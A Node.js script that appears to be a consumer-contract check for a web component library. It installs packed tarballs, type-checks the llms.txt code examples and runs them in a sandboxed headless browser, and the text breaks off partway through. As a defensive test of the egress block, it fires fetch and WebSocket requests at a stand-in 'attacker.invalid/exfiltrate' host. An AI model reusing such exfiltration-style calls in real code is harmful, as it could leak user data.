#!/usr/bin/env node
// @spec:018-project-integrity-hardening#S8
import { spawnSync } from 'node:child_process';
import { lstat, mkdir, readdir, readFile, realpath, stat, writeFile } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { dirname, extname, isAbsolute, join, relative, resolve, sep } from 'node:path';
import { fileURLToPath } from 'node:url';
import { TextDecoder } from 'node:util';

import ts from 'typescript';

const repositoryRoot = resolve(fileURLToPath(new URL('../', import.meta.url)));
const requireFromElements = createRequire(
  new URL('../packages/elements/package.json', import.meta.url),
);
const browserOrigin = 'https://consumer.kimen.invalid';

function fail(message) {
  throw new Error(`consumer-contract: ${message}`);
}

export function selectedBrowserEngine() {
  const browserEngines = new Set(['chromium', 'firefox', 'webkit']);
  const engine = process.env.KIMEN_BROWSER_ENGINE ?? 'chromium';
  if (!browserEngines.has(engine)) {
    fail(
      `KIMEN_BROWSER_ENGINE must be exactly chromium, firefox, or webkit; received ${JSON.stringify(engine)}`,
    );
  }
  return engine;
}

export function parseArguments(argv) {
  const required = [
    '--elements-tarball',
    '--tokens-tarball',
    '--llms',
    '--consumer-dir',
    '--cache-dir',
    '--report',
  ];
  const options = new Map();
  for (let index = 0; index < argv.length; index += 2) {
    const flag = argv[index];
    const value = argv[index + 1];
    if (!required.includes(flag) || value === undefined || options.has(flag)) {
      fail('invalid arguments');
    }
    options.set(flag, resolve(value));
  }
  if (options.size !== required.length) {
    fail('invalid arguments');
  }
  return Object.fromEntries([...options].map(([flag, value]) => [flag.slice(2), value]));
}

export async function requireRegularFile(path, label) {
  const information = await stat(path).catch(() => null);
  if (information === null || !information.isFile()) {
    fail(`${label} must be a regular file: ${path}`);
  }
}

export function runCommand(command, arguments_, options, invoke = spawnSync) {
  const result = invoke(command, arguments_, {
    encoding: 'utf8',
    maxBuffer: 16 * 1024 * 1024,
    ...options,
  });
  if (result.status !== 0) {
    const diagnostic = `${result.stdout ?? ''}${result.stderr ?? ''}`.trim();
    fail(diagnostic || result.error?.message || `${command} exited ${String(result.status)}`);
  }
  return result;
}

export function decodeUtf8(bytes, label) {
  try {
    return new TextDecoder('utf-8', { fatal: true }).decode(bytes);
  } catch {
    fail(`${label} must be valid UTF-8`);
  }
}

export function readPackedLlmsFromTarball(elementsTarball, invoke = spawnSync) {
  const invokeTar = (arguments_) => {
    const result = invoke('tar', arguments_, {
      encoding: null,
      maxBuffer: 16 * 1024 * 1024,
    });
    if (result.error || result.status !== 0) {
      const diagnostic =
        `${result.stdout?.toString('utf8') ?? ''}${result.stderr?.toString('utf8') ?? ''}`.trim();
      fail(diagnostic || 'could not inspect the elements tarball');
    }
    return result.stdout;
  };
  const entries = decodeUtf8(invokeTar(['-tzf', elementsTarball]), 'elements tarball entry list')
    .split(/\r?\n/u)
    .filter(Boolean);
  const llmsEntries = entries.filter((entry) => entry === 'package/llms.txt');
  if (llmsEntries.length !== 1) {
    fail(
      `elements tarball packed llms.txt must contain exactly one regular package/llms.txt entry; found ${String(llmsEntries.length)}`,
    );
  }
  const verboseEntries = decodeUtf8(
    invokeTar(['-tvzf', elementsTarball, 'package/llms.txt']),
    'elements tarball llms entry metadata',
  )
    .split(/\r?\n/u)
    .filter(Boolean);
  if (verboseEntries.length !== 1 || !verboseEntries[0].startsWith('-')) {
    fail('elements tarball packed llms.txt entry must be a regular file');
  }
  return invokeTar(['-xOzf', elementsTarball, 'package/llms.txt']);
}

function markdownFences(source) {
  if (typeof source !== 'string') {
    fail('llms.txt fenced examples must be text');
  }
  let open = false;
  for (const line of source.split(/\r?\n/u)) {
    if (/^(?:[ \t]+`{3,}|`{4,}|[ \t]*~{3,})/u.test(line)) {
      fail(`unsupported Markdown fence marker: ${line.trim()}`);
    }
    const standard = /^```(?!`)([^\r\n]*)$/u.exec(line);
    if (standard === null) {
      continue;
    }
    if (!open) {
      open = true;
      continue;
    }
    if (standard[1].trim() !== '') {
      fail(`unsupported Markdown closing fence descriptor: ${standard[1].trim()}`);
    }
    open = false;
  }
  if (open) {
    fail('unterminated Markdown fence');
  }
  return [...source.matchAll(/^```([^\r\n]*)\r?\n([\s\S]*?)^```[ \t]*$/gmu)].map((match) => ({
    body: match[2],
    info: match[1].trim(),
  }));
}

export function extractExecutableSnippets(llmsText) {
  const executableFenceLanguages = new Set(['js', 'javascript', 'ts', 'typescript']);
  const unsupportedExecutableFenceLanguages = new Set([
    'cjs',
    'cts',
    'ecmascript',
    'jsx',
    'mjs',
    'mts',
    'node',
    'tsx',
  ]);
  const snippets = [];
  for (const { body, info } of markdownFences(llmsText)) {
    const normalizedInfo = info.toLowerCase();
    const language = normalizedInfo.split(/\s+/u)[0];
    if (
      unsupportedExecutableFenceLanguages.has(language) ||
      (executableFenceLanguages.has(language) && normalizedInfo !== language)
    ) {
      fail(`unsupported executable fence language or descriptor: ${info}`);
    }
    if (!executableFenceLanguages.has(language)) {
      continue;
    }
    snippets.push({
      language: language === 'js' || language === 'javascript' ? 'js' : 'ts',
      source: body.trimEnd(),
    });
  }
  if (snippets.length === 0) {
    fail('llms.txt contains no executable TypeScript or JavaScript snippets');
  }
  return snippets;
}

function requiredInstallPackages() {
  return ['@kimen/elements', '@kimen/tokens'];
}

function isPackageManagerCommand(command) {
  return /^(?:bun|npm|pnpm|yarn)\b/u.test(command);
}

function parseInstallExample(source) {
  const command = source.trim().replace(/^\$\s+/u, '');
  const installCommandPrefix = /^(?:pnpm\s+add|npm\s+(?:install|i)|yarn\s+add|bun\s+add)\b/u;
  if (!installCommandPrefix.test(command)) {
    if (isPackageManagerCommand(command) && command.includes('@kimen/')) {
      fail(`unsupported installation command: ${command}`);
    }
    return null;
  }
  const installCommand = /^(?:pnpm\s+add|npm\s+(?:install|i)|yarn\s+add|bun\s+add)(?:\s+(.+))?$/u;
  const match = installCommand.exec(command);
  const packages = match?.[1]?.trim().split(/\s+/u).filter(Boolean) ?? [];
  if (packages.length === 0) {
    fail(`installation example has no packages: ${command}`);
  }
  for (const packageName of packages) {
    if (!requiredInstallPackages().includes(packageName)) {
      fail(`installation example references unsupported package ${packageName}`);
    }
  }
  return { command, packages };
}

export function extractInstallExamples(llmsText) {
  if (typeof llmsText !== 'string') {
    fail('llms.txt installation examples must be text');
  }
  const installationFenceLanguages = new Set(['', 'bash', 'console', 'sh', 'shell', 'zsh']);
  const candidates = [];
  for (const { body, info } of markdownFences(llmsText)) {
    const normalizedInfo = info.toLowerCase();
    const lines = body.split(/\r?\n/u);
    const containsInstallCommand = lines.some((line) => {
      const command = line.trim().replace(/^\$\s+/u, '');
      return isPackageManagerCommand(command) && command.includes('@kimen/');
    });
    if (!installationFenceLanguages.has(normalizedInfo)) {
      if (containsInstallCommand) {
        fail(`unsupported installation fence language or descriptor: ${info}`);
      }
      continue;
    }
    candidates.push(...lines);
  }
  const withoutFences = llmsText.replace(/```[\s\S]*?```/gu, '');
  for (const match of withoutFences.matchAll(/`([^`\r\n]+)`/gu)) {
    candidates.push(match[1]);
  }
  const examples = candidates.map(parseInstallExample).filter(Boolean);
  if (examples.length === 0) {
    fail('llms.txt contains no observed installation example');
  }
  const documentedPackages = new Set(examples.flatMap((example) => example.packages));
  for (const packageName of requiredInstallPackages()) {
    if (!documentedPackages.has(packageName)) {
      fail(`installation examples do not install required package ${packageName}`);
    }
  }
  return examples;
}

export function createInstallInvocation(example, tarballsByPackage) {
  const [executable, action] = example.command.split(/\s+/u);
  const supportedAction =
    (executable === 'npm' && (action === 'install' || action === 'i')) ||
    (['bun', 'pnpm', 'yarn'].includes(executable) && action === 'add');
  if (!supportedAction) {
    fail(`unsupported installation command: ${example.command}`);
  }
  const arguments_ = [action];
  for (const packageName of example.packages) {
    const tarball = tarballsByPackage.get(packageName);
    if (typeof tarball !== 'string') {
      fail(`installation package ${packageName} has no candidate tarball`);
    }
    arguments_.push(tarball);
  }
  return { executable, arguments: arguments_ };
}

function parseModule(source, fileName, scriptKind = ts.ScriptKind.JS) {
  const sourceFile = ts.createSourceFile(
    fileName,
    source,
    ts.ScriptTarget.Latest,
    true,
    scriptKind,
  );
  if (sourceFile.parseDiagnostics.length > 0) {
    const diagnostic = ts.flattenDiagnosticMessageText(
      sourceFile.parseDiagnostics[0].messageText,
      '\n',
    );
    fail(`${fileName} cannot be parsed: ${diagnostic}`);
  }
  return sourceFile;
}

export function moduleSpecifiers(source, fileName = 'module.js', scriptKind = ts.ScriptKind.JS) {
  const sourceFile = parseModule(source, fileName, scriptKind);
  const specifiers = [];
  const visit = (node) => {
    if (
      (ts.isImportDeclaration(node) || ts.isExportDeclaration(node)) &&
      node.moduleSpecifier &&
      ts.isStringLiteral(node.moduleSpecifier)
    ) {
      specifiers.push(node.moduleSpecifier.text);
    } else if (
      ts.isCallExpression(node) &&
      node.expression.kind === ts.SyntaxKind.ImportKeyword &&
      node.arguments.length === 1 &&
      ts.isStringLiteral(node.arguments[0])
    ) {
      specifiers.push(node.arguments[0].text);
    }
    ts.forEachChild(node, visit);
  };
  visit(sourceFile);
  return specifiers;
}

function sideEffectModuleSpecifiers(source, fileName) {
  const sourceFile = parseModule(source, fileName, ts.ScriptKind.TS);
  return sourceFile.statements
    .filter(
      (statement) =>
        ts.isImportDeclaration(statement) &&
        statement.importClause === undefined &&
        ts.isStringLiteral(statement.moduleSpecifier),
    )
    .map((statement) => statement.moduleSpecifier.text);
}

export function packageAndSubpath(specifier) {
  const parts = specifier.split('/');
  if (specifier.startsWith('@')) {
    if (parts.length < 2) {
      return null;
    }
    return {
      name: `${parts[0]}/${parts[1]}`,
      subpath: parts.length === 2 ? '.' : `./${parts.slice(2).join('/')}`,
    };
  }
  return { name: parts[0], subpath: parts.length === 1 ? '.' : `./${parts.slice(1).join('/')}` };
}

export function exportedTarget(packageMetadata, subpath) {
  const exportsField = packageMetadata.exports;
  if (typeof exportsField === 'string') {
    return subpath === '.' ? exportsField : null;
  }
  if (exportsField === null || typeof exportsField !== 'object' || Array.isArray(exportsField)) {
    return null;
  }
  let entry = exportsField[subpath];
  let wildcardValue = null;
  if (entry === undefined) {
    const patterns = Object.keys(exportsField)
      .filter((key) => key.indexOf('*') !== -1 && key.indexOf('*') === key.lastIndexOf('*'))
      .map((key) => {
        const [prefix, suffix] = key.split('*');
        if (!subpath.startsWith(prefix) || !subpath.endsWith(suffix)) {
          return null;
        }
        const value = subpath.slice(prefix.length, subpath.length - suffix.length);
        return value === '' ? null : { key, prefix, suffix, value };
      })
      .filter(Boolean)
      .sort(
        (left, right) =>
          right.prefix.length + right.suffix.length - (left.prefix.length + left.suffix.length) ||
          left.key.localeCompare(right.key),
      );
    if (patterns.length > 0) {
      entry = exportsField[patterns[0].key];
      wildcardValue = patterns[0].value;
    }
  }
  const substituteWildcard = (target) => {
    if (typeof target !== 'string') {
      return null;
    }
    if (wildcardValue === null) {
      return target;
    }
    if (target.indexOf('*') === -1 || target.indexOf('*') !== target.lastIndexOf('*')) {
      return null;
    }
    const wildcardIndex = target.indexOf('*');
    return `${target.slice(0, wildcardIndex)}${wildcardValue}${target.slice(wildcardIndex + 1)}`;
  };
  if (typeof entry === 'string') {
    return substituteWildcard(entry);
  }
  if (entry !== null && typeof entry === 'object' && !Array.isArray(entry)) {
    return substituteWildcard(entry.import ?? entry.default ?? null);
  }
  return null;
}

function pathIsWithin(root, path) {
  const fromRoot = relative(root, path);
  return (
    fromRoot === '' ||
    (!fromRoot.startsWith(`..${sep}`) && fromRoot !== '..' && !isAbsolute(fromRoot))
  );
}

async function installedPackageContext(consumerDirectory) {
  const consumerRoot = await realpath(consumerDirectory);
  const nodeModulesPath = join(consumerRoot, 'node_modules');
  const nodeModulesRoot = await realpath(nodeModulesPath).catch(() => null);
  if (nodeModulesRoot === null || !pathIsWithin(consumerRoot, nodeModulesRoot)) {
    fail('consumer node_modules must resolve inside the clean consumer directory');
  }
  return {
    consumerRoot,
    nodeModulesPath,
    nodeModulesRoot,
    workspaceRoot: await realpath(repositoryRoot),
  };
}

async function loadPackageAtPath(context, packagePath, name) {
  const packageInformation = await lstat(packagePath).catch(() => null);
  if (packageInformation === null) {
    fail(`installed package directory is absent for ${name}`);
  }
  if (!packageInformation.isDirectory() && !packageInformation.isSymbolicLink()) {
    fail(`installed package path must be a directory for ${name}`);
  }
  const packageRoot = await realpath(packagePath).catch(() => null);
  const resolvedInformation =
    packageRoot === null ? null : await stat(packageRoot).catch(() => null);
  if (packageRoot === null || resolvedInformation === null || !resolvedInformation.isDirectory()) {
    fail(`installed package path must resolve to a directory for ${name}`);
  }
  if (pathIsWithin(context.workspaceRoot, packageRoot)) {
    fail(`installed package ${name} resolves into the source workspace`);
  }
  if (
    !pathIsWithin(context.nodeModulesRoot, packageRoot) ||
    packageRoot === context.nodeModulesRoot
  ) {
    fail(`installed package ${name} resolves outside consumer node_modules`);
  }
  const metadataFile = await resolvePackageFile(packageRoot, './package.json', `${name} metadata`);
  const metadata = JSON.parse(await readFile(metadataFile.path, 'utf8'));
  if (metadata.name !== name) {
    fail(`installed package identity mismatch for ${name}`);
  }
  return { metadata, packageRoot };
}

export async function loadInstalledPackage(consumerDirectory, name) {
  const context = await installedPackageContext(consumerDirectory);
  return loadPackageAtPath(context, join(context.nodeModulesPath, ...name.split('/')), name);
}

export async function loadInstalledPackageFromImporter(consumerDirectory, importerPath, name) {
  const context = await installedPackageContext(consumerDirectory);
  const importer = await realpath(importerPath).catch(() => null);
  if (importer === null || !pathIsWithin(context.nodeModulesRoot, importer)) {
    fail(`browser importer for ${name} must resolve inside consumer node_modules`);
  }

  let directory = dirname(importer);
  while (pathIsWithin(context.consumerRoot, directory)) {
    const candidate = join(directory, 'node_modules', ...name.split('/'));
    const information = await lstat(candidate).catch(() => null);
    if (information !== null) {
      return loadPackageAtPath(context, candidate, name);
    }
    const parent = dirname(directory);
    if (parent === directory) {
      break;
    }
    directory = parent;
  }
  fail(`installed package directory is absent for ${name} from importer ${importer}`);
}

export async function assertImportsAreExported(snippets, installedPackages) {
  for (const [index, snippet] of snippets.entries()) {
    for (const specifier of moduleSpecifiers(
      snippet,
      `llms-snippet-${String(index + 1)}.ts`,
      ts.ScriptKind.TS,
    )) {
      const parsed = packageAndSubpath(specifier);
      if (parsed === null || !parsed.name.startsWith('@kimen/')) {
        continue;
      }
      const installed = installedPackages.get(parsed.name);
      const target = installed && exportedTarget(installed.metadata, parsed.subpath);
      if (installed === undefined || target === null) {
        fail(`non-exported package import: ${specifier}`);
      }
      await resolvePackageFile(installed.packageRoot, target, `documented import ${specifier}`);
    }
  }
}

function compileRuntime(overrides) {
  return { runCommand, writeFile, ...overrides };
}

export async function compileSnippets(
  snippets,
  consumerDirectory,
  installedPackages,
  overrides = {},
) {
  const runtime = compileRuntime(overrides);
  const compiler = join(repositoryRoot, 'node_modules/.bin/tsc');
  const sideEffectImports = new Set();
  for (const [index, snippet] of snippets.entries()) {
    for (const specifier of sideEffectModuleSpecifiers(
      snippet.source,
      `llms-snippet-${String(index + 1)}.ts`,
    )) {
      const parsed = packageAndSubpath(specifier);
      const installed = parsed && installedPackages.get(parsed.name);
      const target = installed && exportedTarget(installed.metadata, parsed.subpath);
      if (typeof target === 'string' && target.endsWith('.css')) {
        sideEffectImports.add(specifier);
      }
    }
  }
  const ambientDeclarations = join(consumerDirectory, 'kimen-side-effects.d.ts');
  await runtime.writeFile(
    ambientDeclarations,
    `${[...sideEffectImports]
      .sort()
      .map((specifier) => `declare module ${JSON.stringify(specifier)};`)
      .join('\n')}\n`,
    'utf8',
  );
  const reports = [];
  for (const [index, { language, source }] of snippets.entries()) {
    const file = join(consumerDirectory, `llms-snippet-${index + 1}.${language}`);
    await runtime.writeFile(file, `${source}\n`, 'utf8');
    const languageArguments = language === 'js' ? ['--allowJs', '--checkJs'] : [];
    runtime.runCommand(
      compiler,
      [
        '--noEmit',
        '--pretty',
        'false',
        '--strict',
        '--skipLibCheck',
        '--target',
        'ES2022',
        '--module',
        'NodeNext',
        '--moduleResolution',
        'NodeNext',
        '--lib',
        'ES2022,DOM',
        ...languageArguments,
        ambientDeclarations,
        file,
      ],
      { cwd: consumerDirectory, env: process.env },
    );
    reports.push({ index: index + 1, language, status: 'passed' });
  }
  return reports;
}

export function browserSnippetContract(snippets) {
  const registrationBindings = new Set();
  const calledBindings = new Set();
  const tokenCssSpecifiers = new Set();
  const sourceFiles = [];
  for (const [index, snippet] of snippets.entries()) {
    const fileName = `llms-snippet-${String(index + 1)}.ts`;
    const sourceFile = parseModule(snippet, fileName, ts.ScriptKind.TS);
    sourceFiles.push(sourceFile);
    for (const statement of sourceFile.statements) {
      if (!ts.isImportDeclaration(statement) || !ts.isStringLiteral(statement.moduleSpecifier)) {
        continue;
      }
      const specifier = statement.moduleSpecifier.text;
      if (specifier.startsWith('@kimen/tokens/') && statement.importClause === undefined) {
        tokenCssSpecifiers.add(specifier);
      }
      if (specifier !== '@kimen/elements/ki-button') {
        continue;
      }
      const bindings = statement.importClause?.namedBindings;
      if (!bindings || !ts.isNamedImports(bindings)) {
        continue;
      }
      for (const binding of bindings.elements) {
        const importedName = binding.propertyName?.text ?? binding.name.text;
        if (importedName === 'defineCustomElement') {
          registrationBindings.add(binding.name.text);
        }
      }
    }
  }
  for (const sourceFile of sourceFiles) {
    const visit = (node) => {
      if (
        ts.isCallExpression(node) &&
        ts.isIdentifier(node.expression) &&
        registrationBindings.has(node.expression.text)
      ) {
        calledBindings.add(node.expression.text);
      }
      ts.forEachChild(node, visit);
    };
    visit(sourceFile);
  }
  if (registrationBindings.size === 0) {
    fail('llms.txt must import defineCustomElement from @kimen/elements/ki-button');
  }
  if (![...registrationBindings].some((binding) => calledBindings.has(binding))) {
    fail('llms.txt must include a registration call to the imported defineCustomElement');
  }
  if (tokenCssSpecifiers.size !== 1) {
    fail('llms.txt must side-effect import exactly one @kimen/tokens theme stylesheet');
  }
  return {
    elementSpecifier: '@kimen/elements/ki-button',
    tokenCssSpecifier: [...tokenCssSpecifiers][0],
  };
}

export function executableBrowserSnippets(snippets, tokenCssSpecifier) {
  const printer = ts.createPrinter({ newLine: ts.NewLineKind.LineFeed });
  return snippets
    .map((snippet, index) => {
      const transpiled = ts.transpileModule(snippet, {
        fileName: `llms-snippet-${String(index + 1)}.ts`,
        compilerOptions: {
          module: ts.ModuleKind.ESNext,
          target: ts.ScriptTarget.ES2022,
        },
        reportDiagnostics: true,
      });
      const diagnostic = transpiled.diagnostics?.find(
        (entry) => entry.category === ts.DiagnosticCategory.Error,
      );
      if (diagnostic) {
        fail(
          `llms browser snippet cannot be transpiled: ${ts.flattenDiagnosticMessageText(diagnostic.messageText, '\n')}`,
        );
      }
      const sourceFile = parseModule(transpiled.outputText, `llms-browser-${String(index + 1)}.js`);
      const statements = sourceFile.statements.filter(
        (statement) =>
          !(
            ts.isImportDeclaration(statement) &&
            statement.importClause === undefined &&
            ts.isStringLiteral(statement.moduleSpecifier) &&
            statement.moduleSpecifier.text === tokenCssSpecifier
          ),
      );
      const marker = `globalThis.document.documentElement.dataset[${JSON.stringify(
        `kimenSnippet${String(index + 1)}`,
      )}] = "executed";`;
      const checkpoint =
        'await new Promise((resolveFrame) => globalThis.requestAnimationFrame(() => resolveFrame()));\nawait Promise.resolve();';
      return `${printer.printFile(ts.factory.updateSourceFile(sourceFile, statements))}\n${checkpoint}\n${marker}`;
    })
    .join('\n');
}

export function browserContentType(path) {
  switch (extname(path)) {
    case '.css':
      return 'text/css; charset=utf-8';
    case '.html':
      return 'text/html; charset=utf-8';
    case '.json':
      return 'application/json; charset=utf-8';
    default:
      return 'text/javascript; charset=utf-8';
  }
}

export function browserDocument(importMap) {
  const serializedImportMap = JSON.stringify({ imports: importMap }).replaceAll('<', '\\u003c');
  return `<!doctype html><html><head><script type="importmap">${serializedImportMap}</script></head><body></body></html>`;
}

export function browserRequestTarget(url, documentUrl, roots) {
  let parsed;
  let document;
  try {
    parsed = new URL(url);
    document = new URL(documentUrl);
  } catch {
    return null;
  }
  if (
    parsed.origin !== browserOrigin ||
    document.origin !== browserOrigin ||
    parsed.search !== '' ||
    parsed.hash !== ''
  ) {
    return null;
  }
  if (parsed.href === document.href) {
    return { kind: 'document' };
  }
  for (const root of roots) {
    const path = root.files?.get(parsed.href);
    if (typeof path === 'string') {
      return { kind: 'module', path, root };
    }
  }
  return null;
}

export async function resolvePackageFile(packageRoot, target, label) {
  if (typeof target !== 'string' || !target.startsWith('./')) {
    fail(`${label} export target must be package-relative`);
  }
  const root = await realpath(packageRoot);
  const path = await realpath(resolve(root, target)).catch(() => null);
  if (path === null || (path !== root && !path.startsWith(`${root}${sep}`))) {
    fail(`${label} export target escapes or is absent from its installed package`);
  }
  await requireRegularFile(path, label);
  return { path, root };
}

export async function createBrowserModuleGraph({
  consumerDirectory,
  elementSpecifier,
  elementTarget,
  elements,
}) {
  const packages = new Map();
  const roots = [];
  const importMap = {};
  const queued = [];
  const visited = new Set();

  const registerPackage = async (installed) => {
    const canonical = {
      metadata: installed.metadata,
      packageRoot: await realpath(installed.packageRoot),
    };
    const existing = packages.get(canonical.metadata.name);
    if (existing !== undefined) {
      const existingVersion = existing.metadata.version ?? '<unknown>';
      const candidateVersion = canonical.metadata.version ?? '<unknown>';
      if (existing.packageRoot !== canonical.packageRoot || existingVersion !== candidateVersion) {
        fail(
          `ambiguous browser package ${canonical.metadata.name}: ${existingVersion} at ${existing.packageRoot} versus ${candidateVersion} at ${canonical.packageRoot}`,
        );
      }
      return existing;
    }
    packages.set(canonical.metadata.name, canonical);
    return canonical;
  };

  const packageRoute = async (candidate) => {
    const installed = await registerPackage(candidate);
    const existing = roots.find(({ name }) => name === installed.metadata.name);
    if (existing) {
      return existing;
    }
    const root = await realpath(installed.packageRoot);
    const route = {
      files: new Map(),
      installed,
      name: installed.metadata.name,
      root,
      urlPrefix: `${browserOrigin}/modules/${String(roots.length)}/`,
    };
    roots.push(route);
    return route;
  };

  const queuePackageTarget = async (installed, target, specifier) => {
    const route = await packageRoute(installed);
    const file = await resolvePackageFile(installed.packageRoot, target, specifier);
    const packagePath = relative(route.root, file.path).split(sep).join('/');
    const url = new URL(packagePath, route.urlPrefix).href;
    if (specifier !== null) {
      importMap[specifier] = url;
    }
    route.files.set(url, file.path);
    queued.push({ path: file.path, route });
    return url;
  };

  await queuePackageTarget(await registerPackage(elements), elementTarget, elementSpecifier);

  while (queued.length > 0) {
    const current = queued.shift();
    if (visited.has(current.path)) {
      continue;
    }
    visited.add(current.path);
    const source = await readFile(current.path, 'utf8');
    for (const specifier of moduleSpecifiers(source, current.path)) {
      if (specifier.startsWith('./') || specifier.startsWith('../')) {
        const path = await realpath(resolve(dirname(current.path), specifier)).catch(() => null);
        if (
          path === null ||
          (path !== current.route.root && !path.startsWith(`${current.route.root}${sep}`))
        ) {
          fail(`relative browser module import escapes or is absent: ${specifier}`);
        }
        const packagePath = relative(current.route.root, path).split(sep).join('/');
        const url = new URL(packagePath, current.route.urlPrefix).href;
        current.route.files.set(url, path);
        queued.push({ path, route: current.route });
        continue;
      }
      if (specifier.startsWith('/') || specifier.includes(':')) {
        fail(`browser module import must be a package or relative specifier: ${specifier}`);
      }
      const parsed = packageAndSubpath(specifier);
      if (parsed === null) {
        fail(`invalid browser package import: ${specifier}`);
      }
      const installed = await registerPackage(
        parsed.name === current.route.name
          ? current.route.installed
          : await loadInstalledPackageFromImporter(consumerDirectory, current.path, parsed.name),
      );
      const target = exportedTarget(installed.metadata, parsed.subpath);
      if (target === null) {
        fail(`non-exported browser package import: ${specifier}`);
      }
      const mapped = importMap[specifier];
      const url = await queuePackageTarget(installed, target, mapped ? null : specifier);
      if (mapped !== undefined && mapped !== url) {
        fail(`ambiguous browser import mapping for ${specifier}: ${mapped} versus ${url}`);
      }
    }
  }

  return { importMap, roots };
}

function browserRuntime(overrides) {
  return {
    loadPlaywright: () => requireFromElements('playwright'),
    readFile,
    realpath,
    ...overrides,
  };
}

export function createBrowserEvidence(
  observation,
  { engine, httpRequestPolicyEnforced, sentinelsResolved, webSocketPolicyEnforced },
) {
  const themeTokenOverrideResolved =
    observation.overriddenBackgroundColor === 'rgb(1, 2, 3)' &&
    observation.overriddenColor === 'rgb(254, 253, 252)';
  const themeResolved =
    sentinelsResolved &&
    observation.backgroundColor !== null &&
    observation.color !== null &&
    observation.backgroundColor !== '' &&
    observation.color !== '' &&
    observation.backgroundColor !== 'rgba(0, 0, 0, 0)' &&
    observation.backgroundColor !== observation.color &&
    observation.backgroundColor !== observation.overriddenBackgroundColor &&
    observation.color !== observation.overriddenColor &&
    themeTokenOverrideResolved;
  return {
    customElementDefined: observation.customElementDefined,
    engine,
    executedSnippetCount: observation.executedSnippetCount,
    httpRequestPolicyEnforced,
    networkPolicyScope: ['http(s)-requests', 'websocket'],
    shadowButtonRendered: observation.shadowButtonRendered,
    tagName: observation.tagName,
    themeCustomPropertiesResolved: sentinelsResolved,
    themeResolved,
    themeTokenOverrideResolved,
    webSocketPolicyEnforced,
  };
}

export function requirePassingBrowserEvidence(result, expectedSnippetCount) {
  if (
    result.tagName !== 'ki-button' ||
    !result.customElementDefined ||
    !result.shadowButtonRendered ||
    result.executedSnippetCount !== expectedSnippetCount ||
    !result.themeResolved ||
    !result.httpRequestPolicyEnforced ||
    !result.webSocketPolicyEnforced
  ) {
    fail(`browser smoke failed closed: ${JSON.stringify(result)}`);
  }
  return result;
}

export async function runBrowserSmoke(
  {
    browserSource,
    consumerDirectory,
    elementSpecifier,
    engine,
    expectedSnippetCount,
    installedPackages,
    tokenCssSpecifier,
  },
  overrides = {},
) {
  const runtime = browserRuntime(overrides);
  const elements = installedPackages.get('@kimen/elements');
  const tokens = installedPackages.get('@kimen/tokens');
  const elementSubpath = packageAndSubpath(elementSpecifier)?.subpath;
  const tokenSubpath = packageAndSubpath(tokenCssSpecifier)?.subpath;
  const elementTarget = elementSubpath && exportedTarget(elements.metadata, elementSubpath);
  const tokenTarget = tokenSubpath && exportedTarget(tokens.metadata, tokenSubpath);
  if (typeof elementTarget !== 'string' || typeof tokenTarget !== 'string') {
    fail('documented ki-button or token CSS export is unavailable');
  }
  const tokenCssFile = await resolvePackageFile(tokens.packageRoot, tokenTarget, 'token CSS');
  const [tokenCss, moduleGraph] = await Promise.all([
    runtime.readFile(tokenCssFile.path, 'utf8'),
    createBrowserModuleGraph({
      consumerDirectory,
      elementSpecifier,
      elementTarget,
      elements,
    }),
  ]);
  const playwright = runtime.loadPlaywright();
  const browserType = playwright[engine];
  let browser;
  try {
    browser = await browserType.launch({ headless: true });
  } catch (error) {
    fail(`${engine} could not launch from PLAYWRIGHT_BROWSERS_PATH: ${error.message}`);
  }
  try {
    const context = await browser.newContext({ serviceWorkers: 'block' });
    const documentUrl = `${browserOrigin}/index.html`;
    const documentBody = browserDocument(moduleGraph.importMap);
    const blockedRequests = new Set();
    const blockedWebSockets = new Set();
    await context.routeWebSocket(/.*/u, async (webSocket) => {
      blockedWebSockets.add(webSocket.url());
      await webSocket.close({ code: 1008, reason: 'consumer contract blocks browser egress' });
    });
    await context.route('**/*', async (route) => {
      const url = route.request().url();
      const target = browserRequestTarget(url, documentUrl, moduleGraph.roots);
      if (target?.kind === 'document') {
        await route.fulfill({
          body: documentBody,
          contentType: 'text/html; charset=utf-8',
          status: 200,
        });
        return;
      }
      if (target?.kind !== 'module') {
        blockedRequests.add(url);
        await route.abort('blockedbyclient');
        return;
      }
      const candidate = await runtime.realpath(target.path).catch(() => null);
      if (
        candidate === null ||
        candidate !== target.path ||
        (candidate !== target.root.root && !candidate.startsWith(`${target.root.root}${sep}`))
      ) {
        await route.abort('blockedbyclient');
        return;
      }
      const body = await runtime.readFile(candidate).catch(() => null);
      if (body === null) {
        await route.abort('failed');
        return;
      }
      await route.fulfill({ body, contentType: browserContentType(candidate), status: 200 });
    });
    const page = await context.newPage();
    const pageErrors = [];
    page.on('pageerror', (error) => pageErrors.push(error.message));
    await page.goto(documentUrl, { waitUntil: 'domcontentloaded' });
    const deniedProbeUrls = [
      `${browserOrigin}/undeclared-resource.js`,
      'https://attacker.invalid/exfiltrate',
    ];
    for (const url of deniedProbeUrls) {
      const rejected = await page.evaluate(async (requestUrl) => {
        try {
          await globalThis.fetch(requestUrl);
          return false;
        } catch {
          return true;
        }
      }, url);
      if (!rejected || !blockedRequests.has(url)) {
        fail(`browser request policy did not block undeclared request ${url}`);
      }
    }
    const deniedWebSocketUrl = 'wss://attacker.invalid/exfiltrate';
    const webSocketRejected = await page.evaluate(
      (requestUrl) =>
        new Promise((resolveSocket) => {
          const socket = new globalThis.WebSocket(requestUrl);
          socket.addEventListener('open', () => resolveSocket(false), { once: true });
          socket.addEventListener('error', () => resolveSocket(true), { once: true });
          socket.addEventListener('close', () => resolveSocket(true), { once: true });
        }),
      deniedWebSocketUrl,
    );
    if (!webSocketRejected || !blockedWebSockets.has(deniedWebSocketUrl)) {
      fail(`browser request policy did not block WebSocket ${deniedWebSocketUrl}`);
    }
    await page.addStyleTag({ content: tokenCss });
    const themeSentinels = await page.evaluate(() => {
      const rootStyle = globalThis.getComputedStyle(globalThis.document.documentElement);
      const background = rootStyle.getPropertyValue('--ki-button-secondary-neutral-rest-bg').trim();
      const foreground = rootStyle.getPropertyValue('--ki-button-secondary-neutral-rest-fg').trim();
      return {
        background,
        foreground,
        resolved: background !== '' && foreground !== '',
      };
    });
    if (!themeSentinels.resolved) {
      fail(
        `documented theme stylesheet is missing ki-button sentinels: ${JSON.stringify(themeSentinels)}`,
      );
    }
    await page.addScriptTag({
      type: 'module',
      content: browserSource,
    });
    await page.waitForFunction(
      (count) =>
        Object.entries(globalThis.document.documentElement.dataset).filter(
          ([name, value]) => name.startsWith('kimenSnippet') && value === 'executed',
        ).length === count,
      expectedSnippetCount,
    );
    await page.evaluate(
      () =>
